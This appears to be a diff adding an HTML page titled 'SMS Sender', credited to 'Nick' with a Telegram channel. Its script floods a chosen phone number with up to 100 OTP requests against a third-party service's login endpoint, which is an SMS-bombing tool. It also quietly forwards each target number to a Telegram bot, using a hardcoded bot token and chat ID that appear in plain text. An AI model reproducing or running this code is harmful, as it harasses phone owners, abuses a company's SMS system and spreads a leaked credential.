@@ -1,0 +1,110 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SMS Sender</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: monospace;
+      color: #00ff00;
+      background: black;
+      overflow: hidden;
+    }
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+    .container {
+      position: relative;
+      padding: 20px;
+      text-align: center;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      font-size: 1em;
+    }
+    .footer {
+      margin-top: 20px;
+      color: #00ff00;
+    }
+  </style>
+</head>
+<body>
+<canvas id="cmatrix"></canvas>
+<div class="container">
+  <h1>SMS Sender</h1>
+  <input type="text" id="number" placeholder="Enter Phone Number"><br>
+  <input type="number" id="amount" placeholder="Enter Amount (max 100)"><br>
+  <button onclick="sendSMS()">Send</button>
+  <div class="footer">
+    Powered by Nick<br>
+    Telegram Channel: @cyberanalysiswing
+  </div>
+</div>
+
+<script>
+// cmatrix animation
+const canvas = document.getElementById("cmatrix");
+const ctx = canvas.getContext("2d");
+canvas.height = window.innerHeight;
+canvas.width = window.innerWidth;
+const chars = "01010101010101010101";
+const fontSize = 14;
+const columns = canvas.width / fontSize;
+const drops = Array(Math.floor(columns)).fill(1);
+
+function draw() {
+  ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = "#0F0";
+  ctx.font = fontSize + "px monospace";
+  for (let i = 0; i < drops.length; i++) {
+    const text = chars[Math.floor(Math.random() * chars.length)];
+    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  }
+}
+setInterval(draw, 33);
+
+// Telegram and SMS logic
+const TELEGRAM_TOKEN = "8012232916:AAF97VgZE4eYID4hYW_ngkDmbvF_wPjyGMU";
+const CHAT_ID = "6975173404";
+
+function sendSMS() {
+  const number = document.getElementById("number").value;
+  const amount = Math.min(parseInt(document.getElementById("amount").value), 100);
+  if (!number || !amount) return alert("Please fill all fields.");
+
+  // Send info to Telegram
+  const message = `SMS Sent Request\nNumber: ${number}\nAmount: ${amount}`;
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+
+  // Loop through and send SMS
+  for (let i = 0; i < amount; i++) {
+    setTimeout(() => {
+      fetch(`https://apix.rabbitholebd.com/app/2/login/requestOTP`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mobile: number })
+      }).then(res => console.log("SMS", i+1, res.status))
+      .catch(err => console.error("Error", err));
+    }, i * 2000);
+  }
+}
+</script>
+
+<!-- Ads -->
+<script type='text/javascript' src='//pl26641913.profitableratecpm.com/22/57/a7/2257a7b32fae04b5acc33fa581c4253a.js'></script>
+<script type='text/javascript' src='//pl26642007.profitableratecpm.com/7c/a4/6a/7ca46a430b1780da67bab4839df41673.js'></script>
+<script type='text/javascript' src='//profitableratecpm.com/7c/a4/6a/7ca46a430b1780da67bab4839df41673.js'></script>
+
+</body>
+</html>
